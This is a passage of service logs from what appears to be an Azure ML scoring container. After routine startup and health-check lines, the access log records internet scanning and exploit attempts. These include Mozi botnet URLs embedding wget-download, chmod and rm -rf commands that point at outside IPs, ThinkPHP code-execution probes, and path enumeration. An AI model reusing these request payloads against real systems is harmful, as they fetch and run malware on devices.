      "rsyslogd: /azureml-envs/azureml_15763e971906533c82eb47fe03a807b1/lib/libuuid.so.1: no version information available (required by rsyslogd)\n",
      "EdgeHubConnectionString and IOTEDGE_IOTHUBHOSTNAME are not set. Exiting...\n",
      "2021-01-27T06:52:43,325920916+00:00 - iot-server/finish 1 0\n",
      "2021-01-27T06:52:43,327602023+00:00 - Exit code 1 is normal. Not restarting iot-server.\n",
      "Starting gunicorn 19.9.0\n",
      "Listening at: http://127.0.0.1:31311 (14)\n",
      "Using worker: sync\n",
      "worker timeout is set to 300\n",
      "Booting worker with pid: 41\n",
      "SPARK_HOME not set. Skipping PySpark Initialization.\n",
      "Generating new fontManager, this may take some time...\n",
      "Initializing logger\n",
      "2021-01-27 06:52:44,627 | root | INFO | Starting up app insights client\n",
      "2021-01-27 06:52:44,627 | root | INFO | Starting up request id generator\n",
      "2021-01-27 06:52:44,627 | root | INFO | Starting up app insight hooks\n",
      "2021-01-27 06:52:44,627 | root | INFO | Invoking user's init function\n",
      "2021-01-27 06:52:46,943 | azureml.core | WARNING | Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
      "Failure while loading azureml_run_type_providers. Failed to load entrypoint automl = azureml.train.automl.run:AutoMLRun._from_run_dto with exception cannot import name 'RunType'.\n",
      "2021-01-27 06:52:47,134 | root | INFO | Users's init has completed successfully\n",
      "2021-01-27 06:52:47,187 | root | INFO | Skipping middleware: dbg_model_info as it's not enabled.\n",
      "2021-01-27 06:52:47,188 | root | INFO | Skipping middleware: dbg_resource_usage as it's not enabled.\n",
      "2021-01-27 06:52:47,199 | root | INFO | Scoring timeout is found from os.environ: 60000 ms\n",
      "2021-01-27 06:52:49,809 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:52:49 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:55:35,119 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:55:35 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:55:36,187 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:55:36 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:55:50,043 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:55:50 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:55:50,850 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:55:50 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:56:25,367 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:56:25 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:56:25,943 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:56:25 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:57:45,185 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:57:45 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-27 06:57:46,289 | root | INFO | Validation Request Content-Type\n",
      "2021-01-27 06:57:46,289 | root | INFO | Scoring Timer is set to 60.0 seconds\n",
      "2021-01-27 06:57:46,409 | root | INFO | 200\n",
      "127.0.0.1 - - [27/Jan/2021:06:57:46 +0000] \"POST /score HTTP/1.0\" 200 58 \"-\" \"python-requests/2.25.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:07:51:24 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:09:39:27 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F182.56.30.248%3A47861%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:05 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:06 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:08 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:10 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:12 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:16:13 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [27/Jan/2021:10:30:52 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:12:16:30 +0000] \"GET /shell?%2Ftmp%2FMozi.a+jaws=&cd+%2Ftmp=&chmod+777+Mozi.a=&rm+-rf+%2A=&wget+http%3A%2F%2F117.222.174.115%3A47116%2FMozi.a= HTTP/1.0\" 404 232 \"-\" \"Hello, world\"\n",
      "127.0.0.1 - - [27/Jan/2021:13:00:38 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:13:05:51 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:13:05:51 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - j4BFwu6M [27/Jan/2021:13:05:52 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:13:21:27 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:13:21:27 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - yiWsBbJP [27/Jan/2021:13:21:27 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:09 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:09 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:10 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:10 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:11 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:11 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:00:12 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:15:11:45 +0000] \"GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"\n",
      "127.0.0.1 - - [27/Jan/2021:16:18:02 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:16:32:57 +0000] \"POST /boaform/admin/formLogin HTTP/1.0\" 404 232 \"http://20.193.18.43:80/admin/login.asp\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:16:51:55 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:55 +0000] \"GET /nmaplowercheck1611777531 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /repos/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /repo/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /svn/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /cvs/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /archiva/index.action HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:19:58:58 +0000] \"GET /index.action HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [27/Jan/2021:21:19:11 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:21:19:12 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - zVxLyS0s [27/Jan/2021:21:19:12 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:22:08:07 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [27/Jan/2021:22:49:41 +0000] \"GET /HNAP1/ HTTP/1.0\" 404 232 \"http://20.193.18.43/\" \"Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1\"\n",
      "127.0.0.1 - - [27/Jan/2021:23:02:44 +0000] \"GET /setup.cgi?cmd=rm+-rf+%2Ftmp%2F%2A&curpath=%2F&currentsetting.htm=1&next_file=netgear.cfg&sh+netgear=&todo=syscmd&wget+http%3A%2F%2F117.194.167.17%3A54210%2FMozi.m+-O+%2Ftmp%2Fnetgear= HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:00:09:22 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:00:09:22 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - UQJXDMjj [28/Jan/2021:00:09:22 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:03:53:57 +0000] \"GET /swagger HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:56 +0000] \"GET /TP/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:57 +0000] \"GET /TP/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:57 +0000] \"GET /thinkphp/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:58 +0000] \"GET /TP/html/public/index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:59 +0000] \"GET /elrekt.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:08:31:59 +0000] \"GET /index.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)\"\n",
      "127.0.0.1 - - [28/Jan/2021:14:18:55 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - Cm7lenWq [28/Jan/2021:15:04:23 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:15:56:15 +0000] \"GET /echo.php HTTP/1.0\" 404 232 \"https://www.google.com/\" \"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:09:57 +0000] \"POST /HNAP1/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"GET /index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP21 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:38 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:39 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:40 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:40 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:25:41 +0000] \"GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
      "127.0.0.1 - - [28/Jan/2021:16:48:52 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "127.0.0.1 - - [28/Jan/2021:19:09:22 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:19:09:22 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - Z2UNu1KS [28/Jan/2021:19:09:22 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - XoPm5ozI [28/Jan/2021:21:57:52 +0000] \"GET /manager/html/ HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [28/Jan/2021:22:33:10 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
      "2021-01-28 22:58:42,100 | root | INFO | 200\n",
      "127.0.0.1 - - [28/Jan/2021:22:58:42 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-28 22:58:43,089 | root | INFO | 200\n",
      "127.0.0.1 - - [28/Jan/2021:22:58:43 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:02:31:26 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0\"\n",
      "127.0.0.1 - - [29/Jan/2021:02:55:36 +0000] \"GET /actuator/health HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 zgrab/0.x\"\n",
      "127.0.0.1 - - [29/Jan/2021:04:25:33 +0000] \"GET /nmaplowercheck1611894325 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [29/Jan/2021:04:25:33 +0000] \"GET /pools/default/buckets HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "127.0.0.1 - - [29/Jan/2021:04:25:34 +0000] \"GET /pools HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\"\n",
      "2021-01-29 05:07:41,464 | root | INFO | 200\n",
      "127.0.0.1 - - [29/Jan/2021:05:07:41 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "2021-01-29 05:07:41,479 | root | INFO | 200\n",
      "127.0.0.1 - - [29/Jan/2021:05:07:41 +0000] \"GET /swagger.json HTTP/1.0\" 200 2446 \"-\" \"Go-http-client/1.1\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:13 +0000] \"GET /phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:14 +0000] \"GET /phpMyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:15 +0000] \"GET /phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:15 +0000] \"GET /phpmyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:16 +0000] \"GET /mysql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:17 +0000] \"GET /database/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:17 +0000] \"GET /phpmyadmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:18 +0000] \"GET /phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:19 +0000] \"GET /phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:19 +0000] \"GET /phpmyadmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:20 +0000] \"GET /phpmyadmin5/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:21 +0000] \"GET /phpMyAdmin1/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:21 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
      "127.0.0.1 - - [29/Jan/2021:05:55:22 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
